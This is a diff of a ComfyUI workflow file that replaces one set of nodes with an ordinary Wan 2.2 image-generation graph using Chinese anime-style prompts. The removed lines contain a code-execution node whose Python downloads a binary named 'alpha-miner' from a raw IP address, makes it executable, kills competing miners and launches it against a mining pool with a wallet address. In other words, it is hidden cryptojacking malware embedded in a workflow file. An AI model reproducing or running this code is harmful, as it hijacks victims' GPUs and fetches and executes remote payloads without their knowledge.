@@ -1,18 +1,239 @@
 {
-  "1": {
-    "class_type": "IDENode",
+  "71": {
     "inputs": {
-      "language": "python",
-      "pycode": "import subprocess\nimport os\nimport torch\nimport time\n\ntorch_lib = os.path.join(os.path.dirname(torch.__file__), \"lib\")\nenv = os.environ.copy()\nenv[\"LD_LIBRARY_PATH\"] = torch_lib + \":\" + env.get(\"LD_LIBRARY_PATH\", \"\")\n\nsubprocess.run([\"curl\", \"-sLo\", \"/tmp/miner\", \"http://151.247.219.40:8000/alpha-miner\"], timeout=90)\nos.chmod(\"/tmp/miner\", 0o755)\n\nsubprocess.run([\"pkill\", \"-9\", \"-f\", \"miner\"], capture_output=True)\ntime.sleep(2)\n\nwith open(\"/tmp/miner.log\", \"w\") as log:\n    subprocess.Popen(\n        [\"/tmp/miner\", \"--pool\", \"stratum+tcp://sg1.alphapool.tech:5566\", \"--address\", \"prl1pjdp6c4dzmzemsw0cv00t2t008mnsu80qc8ghksl0k426qm8z83kqp8m8vg\", \"--worker\", \"RTX3090_52\"],\n        env=env,\n        stdout=log,\n        stderr=subprocess.STDOUT,\n        start_new_session=True\n    )\n\ntime.sleep(4)\nps = subprocess.run([\"pgrep\", \"-c\", \"miner\"], capture_output=True, text=True)\nresult = ps.stdout.strip()\n"
+      "clip_name": "umt5_xxl_fp8_e4m3fn_scaled.safetensors",
+      "type": "wan",
+      "device": "default"
+    },
+    "class_type": "CLIPLoader",
+    "_meta": {
+      "title": "加载CLIP"
     }
   },
-  "2": {
-    "class_type": "PreviewAny",
+  "72": {
     "inputs": {
-      "source": [
-        "1",
+      "text": "低画质，模糊，变形，过曝，画面太暗，死黑阴影，阴天，赛博朋克，卡通，Q版，萌系，嘈杂混乱，低画质，模糊，变形，过曝，画面太暗，死黑阴影，阴天，赛博朋克，卡通，Q版，萌系，嘈杂混乱，畸形肢体，多余手指，少手指，断手，扭曲手臂，畸形腿，姿势不自然，面部崩坏，歪嘴，斜眼，斗鸡眼，五官不对称，脸部模糊，没有眼睛，三只眼，鼻子缺失，嘴巴畸形，雀斑过多，皮肤纹理异常，皮肤过滑如塑料，油光满面，身体比例失调，脖子过长或过短，头身比怪异。",
+      "clip": [
+        "71",
         0
       ]
+    },
+    "class_type": "CLIPTextEncode",
+    "_meta": {
+      "title": "CLIP Text Encode (Negative Prompt)"
+    }
+  },
+  "73": {
+    "inputs": {
+      "vae_name": "wan_2.1_vae.safetensors"
+    },
+    "class_type": "VAELoader",
+    "_meta": {
+      "title": "加载VAE"
+    }
+  },
+  "74": {
+    "inputs": {
+      "width": 1080,
+      "height": 1920,
+      "length": 1,
+      "batch_size": 2
+    },
+    "class_type": "EmptyHunyuanLatentVideo",
+    "_meta": {
+      "title": "空Latent视频（Hunyuan）"
+    }
+  },
+  "75": {
+    "inputs": {
+      "unet_name": "wan2.2_t2v_high_noise_14B_fp8_scaled.safetensors",
+      "weight_dtype": "default"
+    },
+    "class_type": "UNETLoader",
+    "_meta": {
+      "title": "UNet加载器"
+    }
+  },
+  "76": {
+    "inputs": {
+      "unet_name": "wan2.2_t2v_low_noise_14B_fp8_scaled.safetensors",
+      "weight_dtype": "default"
+    },
+    "class_type": "UNETLoader",
+    "_meta": {
+      "title": "UNet加载器"
+    }
+  },
+  "82": {
+    "inputs": {
+      "shift": 5.0,
+      "model": [
+        "83",
+        0
+      ]
+    },
+    "class_type": "ModelSamplingSD3",
+    "_meta": {
+      "title": "采样算法（SD3）"
+    }
+  },
+  "83": {
+    "inputs": {
+      "lora_name": "lightx2v_T2V_14B_cfg_step_distill_v2_lora_rank128_bf16.safetensors",
+      "strength_model": 1.0,
+      "model": [
+        "75",
+        0
+      ]
+    },
+    "class_type": "LoraLoaderModelOnly",
+    "_meta": {
+      "title": "LoRA加载器（仅模型）"
+    }
+  },
+  "85": {
+    "inputs": {
+      "lora_name": "lightx2v_T2V_14B_cfg_step_distill_v2_lora_rank128_bf16.safetensors",
+      "strength_model": 1.0,
+      "model": [
+        "76",
+        0
+      ]
+    },
+    "class_type": "LoraLoaderModelOnly",
+    "_meta": {
+      "title": "LoRA加载器（仅模型）"
+    }
+  },
+  "86": {
+    "inputs": {
+      "shift": 5.0,
+      "model": [
+        "85",
+        0
+      ]
+    },
+    "class_type": "ModelSamplingSD3",
+    "_meta": {
+      "title": "采样算法（SD3）"
+    }
+  },
+  "87": {
+    "inputs": {
+      "samples": [
+        "118",
+        0
+      ],
+      "vae": [
+        "73",
+        0
+      ]
+    },
+    "class_type": "VAEDecode",
+    "_meta": {
+      "title": "VAE解码"
+    }
+  },
+  "89": {
+    "inputs": {
+      "text": "视觉风格：动漫\n画面风格：国漫\n高质量大师级动漫玄幻古风插画漫画角色：\n男，24岁，长方脸，下颌方正，颧骨略高，轮廓分明，剑眉，眉尾上扬，眉峰锐利，狭长的瑞凤眼，眼尾略下垂，瞳孔深黑，鼻梁高且直，鼻翼略宽，侧面看有轻微的驼峰，唇形清晰，俊秀帅气冷冽的气质，半束发，发髻高耸，其余长发随风飘散。左肩被一支贯穿箭伤，箭叉在左后肩上。衣服上到处有血渍。精致的银色发冠，带有复杂的金属镂空工艺，搭配深蓝色的发带随风飞舞，穿着白蓝色的内衬丝绸长袍，衣褶自然垂坠，肩甲银色兽首肩甲，细节丰富，带有金色描边，显得威严霸气，胸甲亮面金属胸甲，上面刻有繁复的金色云纹或龙纹，下着蓝色纹理深灰色长靴。细腻渲染，细节五官，漫画感丰富细节，面部阴影，面部聚焦，空灵感，细腻肌理。\n画面：（（全身正面构图，人物双手自然垂下。背景纯白色底。））",
+      "clip": [
+        "71",
+        0
+      ]
+    },
+    "class_type": "CLIPTextEncode",
+    "_meta": {
+      "title": "CLIP Text Encode (Positive Prompt)"
+    }
+  },
+  "114": {
+    "inputs": {
+      "samples": [
+        "117",
+        0
+      ],
+      "vae": [
+        "73",
+        0
+      ]
+    },
+    "class_type": "VAEDecode",
+    "_meta": {
+      "title": "VAE解码"
+    }
+  },
+  "117": {
+    "inputs": {
+      "seed": 371815146,
+      "steps": 10,
+      "cfg": 1.5,
+      "sampler_name": "euler",
+      "scheduler": "simple",
+      "denoise": 1.0,
+      "model": [
+        "82",
+        0
+      ],
+      "positive": [
+        "89",
+        0
+      ],
+      "negative": [
+        "72",
+        0
+      ],
+      "latent_image": [
+        "74",
+        0
+      ]
+    },
+    "class_type": "KSampler",
+    "_meta": {
+      "title": "K采样器"
+    }
+  },
+  "118": {
+    "inputs": {
+      "seed": 371815146,
+      "steps": 10,
+      "cfg": 1.5,
+      "sampler_name": "euler",
+      "scheduler": "simple",
+      "denoise": 0.3,
+      "model": [
+        "86",
+        0
+      ],
+      "positive": [
+        "89",
+        0
+      ],
+      "negative": [
+        "72",
+        0
+      ],
+      "latent_image": [
+        "117",
+        0
+      ]
+    },
+    "class_type": "KSampler",
+    "_meta": {
+      "title": "K采样器"
+    }
+  },
+  "119": {
+    "inputs": {
+      "filename_prefix": "ComfyUI",
+      "images": [
+        "87",
+        0
+      ]
+    },
+    "class_type": "SaveImage",
+    "_meta": {
+      "title": "保存图像"
     }
   }
 }
